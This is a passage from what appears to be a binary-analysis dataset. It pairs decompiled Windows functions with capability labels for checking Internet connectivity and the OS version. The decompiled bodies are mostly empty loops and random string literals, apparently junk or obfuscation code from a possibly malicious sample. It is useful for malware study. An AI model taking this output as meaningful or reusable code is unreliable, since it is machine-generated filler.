*0x5221d8;\n    fcn.00483110();\n    fcn.004b21e0(0x51a7a8, &var_64h);\n    fcn.00483140();\n    var_21h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"nphzaqxheuzptygcsuteclkcydwxqaczjcyjblibtxdltrvhtvpocecsbijbsmumwikbontwazweufchonb\", &var_64h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"timumarwyeupjquambalmoiufozyvnuoysdgdowmgunaxsqjsaacuxsfzgcqfp\", &var_64h + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"dklsjtzjuthxkyzbfcjwysdgchldvqgzvhssdkzpkpvwwjgfnfflvyjc\", &var_64h + 3);\n    fcn.00483140();\n    var_22h = 1;\n    var_28h = 0x918;\n    fcn.00483110();\n    fcn.004b21e0(\"dklsjtzjuthxkyzbfcjwysdgchldvqgzvhssdkzpkpvwwjgfnfflvyjc\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"dklsjtzjuthxkyzbfcjwysdgchldvqgzvhssdkzpkpvwwjgfnfflvyjc\", &var_29h);\n    cVar2 = fcn.004c1070(&var_45h + 1, var_60h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x5221e0;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x3e; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (stack0xffffffec = 0x10; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 928
    },
    "0040edda": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040edda(void)\n\n{\n    char cVar1;\n    uint var_dch;\n    uint var_d8h;\n    uint var_c0h;\n    uint var_a6h;\n    uint var_89h;\n    uint var_6dh;\n    uint var_51h;\n    uchar var_36h;\n    uchar var_35h;\n    uint var_34h;\n    ulong uStack52;\n    ulong uStack44;\n    ulong uStack36;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"rethcxwwsrwytrhoszvcfkdixschiyjikieuelwoiuetwjhbqfhuksvhrgyqddxjmzvnrbgbfd\", &var_a6h);\n    fcn.00483140();\n    uStack36 = *0x5221e8;\n    uStack44 = *0x5221f0;\n    uStack52 = *0x5221f8;\n    var_34h = 0xd37;\n    var_35h = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"wtzjhsnjfydiagzmudn\", &var_a6h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"rethcxwwsrwytrhoszvcfkdixschiyjikieuelwoiuetwjhbqfhuksvhrgyqddxjmzvnrbgbfd\", &var_89h);\n    fcn.00483110();\n    fcn.004b21e0(\"rethcxwwsrwytrhoszvcfkdixschiyjikieuelwoiuetwjhbqfhuksvhrgyqddxjmzvnrbgbfd\", &var_6dh);\n    cVar1 = fcn.004c1070(&var_89h + 1, &var_a6h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x4c; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"wtzjhsnjfydiagzmudn\", &var_51h);\n    fcn.00483110();\n    fcn.004b21e0(\"wtzjhsnjfydiagzmudn\", &var_36h);\n    cVar1 = fcn.004c09a0(&var_51h + 1, &var_6dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffec = 0x59; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 801
    },
    "0040f128": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 __cdecl fcn.0040f128(uint noname_0, uint arg_ch)\n\n{\n    double dVar1;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_eh;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"uqurhmbsjadjizantcjcedsztknuzlgiqqaabvtiplgbizkhyddgxdakghbqbtpmxljvabcjxxjimquziwwitisu\", &var_eh);\n    fcn.00483140();\n    dVar1 = *0x522200;\n    var_eh._1_1_ = 1;\n    for (stack0xfffffff0 = 0x34; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 246
    },
    "0040f2f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040f2f0(uint param_1)\n\n{\n    uint var_5ch;\n    uint var_4ch;\n    uint var_33h;\n    ulong uStack44;\n    uint var_19h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x8e8;\n    stack0xffffffe4 = *0x522218;\n    var_19h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"chyegvwxeizikrxppezbdymhtbbjduf\", &var_33h);\n    fcn.00483140();\n    uStack44 = *0x522220;\n    stack0xffffffcc = *0x522228;\n    var_33h._2_1_ = 1;\n    for (var_ch = 5; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"obhnqrjasrfioj\", &var_33h + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    return param_1;\n}\n",
        "token_count": 315
    },
    "0040f3e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040f3e2(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint in_ECX;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_1dh;\n    uint var_1ch;\n    int32_t var_15h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_15h._0_1_ = 1;\n    var_1ch = 0x80a;\n    for (var_ch = 0x4d; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x3d; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (stack0xffffffe8 = 6; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"jtiefxherfkfpkcdilvi\", &var_1dh);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 344
    },
    "0040f6ca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040f6ca(void)\n\n{\n    uint var_34h;\n    uint var_21h;\n    uint var_11h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 8; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0x4a; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "0041007e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.0041007e(uint arg_8h)\n\n{\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_50h;\n    uint var_37h;\n    ulong uStack52;\n    ulong uStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0xe89;\n    var_18h = 0x4da;\n    var_1ch = 0xa2e;\n    fcn.00483110();\n    fcn.004b21e0(\"tfsqketlphxvhtrjnahpacagpdieisktzrrfxvjjjsdhwlql\", &var_37h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"nphybayqjihgtlxdypibicibdwazriqgjwjjpeizsooodypzzvvholsezu\", &var_37h + 1);\n    fcn.00483140();\n    uStack44 = *0x5222f0;\n    uStack52 = *0x5222f8;\n    stack0xffffffc8 = 0x1589;\n    var_37h._2_1_ = 0;\n    for (var_ch = 0x25; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x1f; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 431
    },
    "00410280": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00410280(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h, uint arg_1ch)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_9ch;\n    uint var_90h;\n    uint var_75h;\n    uint var_59h;\n    uchar var_3dh;\n    uint var_3ch;\n    ulong uStack60;\n    uint var_29h;\n    ulong uStack36;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack36 = *0x522300;\n    stack0xffffffd4 = *0x522308;\n    var_29h._0_1_ = 1;\n    uStack60 = *0x522310;\n    var_3ch = 0x42f;\n    fcn.00483110();\n    fcn.004b21e0(\"rkqijtfcfwyuuxoswfsexndbcddchtmzvcuvvucjlkwpyksfjfshqromesmyzi\", &var_75h);\n    fcn.00483140();\n    for (var_ch = 0x47; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"rkqijtfcfwyuuxoswfsexndbcddchtmzvcuvvucjlkwpyksfjfshqromesmyzi\", &var_59h);\n    fcn.00483110();\n    fcn.004b21e0(\"rkqijtfcfwyuuxoswfsexndbcddchtmzvcuvvucjlkwpyksfjfshqromesmyzi\", &var_3dh);\n    cVar2 = fcn.004c1070(&var_59h + 1, &var_75h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522318;\n    if (cVar2 != '\\0') {\n        for (var_10h = 99; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 0x5f; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 656
    },
    "004104da": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __fastcall fcn.004104da(uint param_1)\n\n{\n    uint var_6ch;\n    uint var_5ch;\n    uint var_44h;\n    uint var_2bh;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"mbrpyswunoaxytqn\", &var_2bh);\n    fcn.00483140();\n    uStack28 = *0x522330;\n    var_1ch = 0x1f37;\n    fcn.00483110();\n    fcn.004b21e0(0x51aeba, &var_2bh + 1);\n    fcn.00483140();\n    stack0xffffffd4 = *0x522338;\n    for (var_ch = 9; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x16; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ncjjxoiolgbykozamw\", &var_2bh + 2);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    return param_1;\n}\n",
        "token_count": 354
    },
    "00410624": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.00410624(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint noname_4, uint noname_5, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_50h;\n    uint var_38h;\n    uint var_1eh;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x522340;\n    fcn.00483110();\n    fcn.004b21e0(\"qypnxwafnaxfmaffuhdjqlehibblrxvbioizfxuevc\", &var_1eh);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"zzvxiuwwifwsgirnekumvyliyscfugwhhoprbhzrljhaarzipdfsag\", &var_1eh + 1);\n    fcn.00483140();\n    stack0xffffffe0 = 0x805;\n    for (var_ch = 0x5e; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 344
    },
    "0041071c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.0041071c(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_2ch;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x32b;\n    var_11h = 1;\n    var_12h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"kmlxsnxfnuvdafybhgckndrizqfepmhmqmsvshxuhunjnfmtntwpnczngpgaeibxwamwcltqtuhciqf\", &var_13h);\n    fcn.00483140();\n    for (var_ch = 0x5c; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 315
    },
    "004107c6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __fastcall fcn.004107c6(uint param_1)\n\n{\n    char cVar1;\n    uint var_dch;\n    uint var_d0h;\n    uint var_b8h;\n    uint var_9eh;\n    uint var_81h;\n    uint var_65h;\n    uint var_49h;\n    uchar var_2eh;\n    uchar var_2dh;\n    uint var_2ch;\n    ulong uStack44;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack44 = *0x522348;\n    fcn.00483110();\n    fcn.004b21e0(\"bsflsddfizbhrcrmufemdcpjzdgdallmxyimioduayestye\", &var_9eh);\n    fcn.00483140();\n    var_2ch = 0x88d;\n    fcn.00483110();\n    fcn.004b21e0(0x51afb4, &var_9eh + 1);\n    fcn.00483140();\n    for (var_ch = 0x5e; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x21; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 0x4b; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"bsflsddfizbhrcrmufemdcpjzdgdallmxyimioduayestye\", &var_81h);\n    fcn.00483110();\n    fcn.004b21e0(\"bsflsddfizbhrcrmufemdcpjzdgdallmxyimioduayestye\", &var_65h);\n    cVar1 = fcn.004c09a0(&var_81h + 1, &var_9eh + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_18h = 0x1b; 0 < var_18h; var_18h = var_18h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"bsflsddfizbhrcrmufemdcpjzdgdallmxyimioduayestye\", &var_49h);\n    fcn.00483110();\n    fcn.004b21e0(\"bsflsddfizbhrcrmufemdcpjzdgdallmxyimioduayestye\", &var_2eh);\n    cVar1 = fcn.004c09a0(&var_49h + 1, &var_65h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_1ch = 0x22; 0 < var_1ch; var_1ch = var_1ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"pbynzgmlzuno\", &var_2dh);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    return param_1;\n}\n",
        "token_count": 880
    },
    "00410af0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00410af0(uint noname_0, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_8ch;\n    uint var_71h;\n    uint var_55h;\n    uint var_39h;\n    ulong uStack52;\n    uint var_21h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"qspkekouppydqgsrpiuhcx\", &var_71h);\n    fcn.00483140();\n    stack0xffffffdc = *0x522350;\n    var_21h._0_1_ = 0;\n    uStack52 = *0x522358;\n    stack0xffffffc4 = *0x522360;\n    for (var_ch = 0x29; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x3c; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"qspkekouppydqgsrpiuhcx\", &var_55h);\n    fcn.00483110();\n    fcn.004b21e0(\"qspkekouppydqgsrpiuhcx\", &var_39h);\n    cVar2 = fcn.004c09a0(&var_55h + 1, &var_71h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522368;\n    if (cVar2 != '\\0') {\n        for (var_14h = 0x13; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 558
    },
    "004116ba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint fcn.004116ba(void)\n\n{\n    char cVar1;\n    uint var_ech;\n    uint var_e4h;\n    uint var_cch;\n    uint var_b2h;\n    uint var_95h;\n    uint var_79h;\n    uint var_5dh;\n    uint var_41h;\n    ulong uStack60;\n    ulong uStack52;\n    uchar var_21h;\n    uint var_20h;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x5223d8;\n    fcn.00483110();\n    fcn.004b21e0(\"bvyfqayjcoooaahpcosxnncprxmryeecns\", &var_b2h);\n    fcn.00483140();\n    var_1ch = 0x1120;\n    var_20h = 0x5e8;\n    var_21h = 0;\n    uStack52 = *0x5223e0;\n    uStack60 = *0x5223e8;\n    stack0xffffffbc = *0x5223f0;\n    fcn.00483110();\n    fcn.004b21e0(\"feilmtxsgnerqawgmaqoqdouujugewfondrvgmzyaghbqwsitxkovtcac\", &var_b2h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"feilmtxsgnerqawgmaqoqdouujugewfondrvgmzyaghbqwsitxkovtcac\", &var_95h);\n    fcn.00483110();\n    fcn.004b21e0(\"feilmtxsgnerqawgmaqoqdouujugewfondrvgmzyaghbqwsitxkovtcac\", &var_79h);\n    cVar1 = fcn.004c1070(&var_95h + 1, &var_b2h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 5; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"bvyfqayjcoooaahpcosxnncprxmryeecns\", &var_5dh);\n    fcn.00483110();\n    fcn.004b21e0(\"bvyfqayjcoooaahpcosxnncprxmryeecns\", &var_41h);\n    cVar1 = fcn.004c1070(&var_5dh + 1, &var_79h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x1b; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 798
    },
    "00411a12": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00411a12(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint arg_2ch, uint arg_30h, uint arg_34h, uint arg_38h)\n\n{\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_21h;\n    uint var_11h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 1; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "00411a9a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00411a9a(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_c0h;\n    uint var_a6h;\n    uint var_89h;\n    uint var_6dh;\n    uint var_51h;\n    uchar var_35h;\n    uint var_34h;\n    uchar var_2dh;\n    uint var_2ch;\n    ulong uStack44;\n    uint var_1ch;\n    int32_t var_15h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_15h._0_1_ = 0;\n    var_1ch = 0x2aa;\n    uStack44 = *0x522410;\n    var_2ch = 0x39;\n    fcn.00483110();\n    fcn.004b21e0(\"rqohvszvisabqiajcjuqoptaarerjbrapaqmtjsikqmkxrqe\", &var_a6h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"gwrqazdcxykonuo\", &var_a6h + 1);\n    fcn.00483140();\n    var_2dh = 0;\n    var_34h = 0x553;\n    for (var_ch = 0x50; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"rqohvszvisabqiajcjuqoptaarerjbrapaqmtjsikqmkxrqe\", &var_89h);\n    fcn.00483110();\n    fcn.004b21e0(\"rqohvszvisabqiajcjuqoptaarerjbrapaqmtjsikqmkxrqe\", &var_6dh);\n    cVar2 = fcn.004c1070(&var_89h + 1, &var_a6h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_10h = 0x1b; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"rqohvszvisabqiajcjuqoptaarerjbrapaqmtjsikqmkxrqe\", &var_51h);\n    fcn.00483110();\n    fcn.004b21e0(\"rqohvszvisabqiajcjuqoptaarerjbrapaqmtjsikqmkxrqe\", &var_35h);\n    cVar2 = fcn.004c1070(&var_51h + 1, &var_6dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522418;\n    if (cVar2 != '\\0') {\n        for (stack0xffffffe8 = 0x4e; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 915
    },
    "00411e18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.00411e18(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint arg_2ch)\n\n{\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_3ch;\n    uchar var_22h;\n    uchar var_21h;\n    uint var_20h;\n    uint var_1ch;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x522438;\n    var_1ch = 0xe92;\n    var_20h = 0x393;\n    var_21h = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"uultghmsxxkhjimrjarkuerydgkfyqm\", &var_22h);\n    fcn.00483140();\n    for (var_ch = 0x29; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    return 0xa154;\n}\n",
        "token_count": 354
    },
    "00411eec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
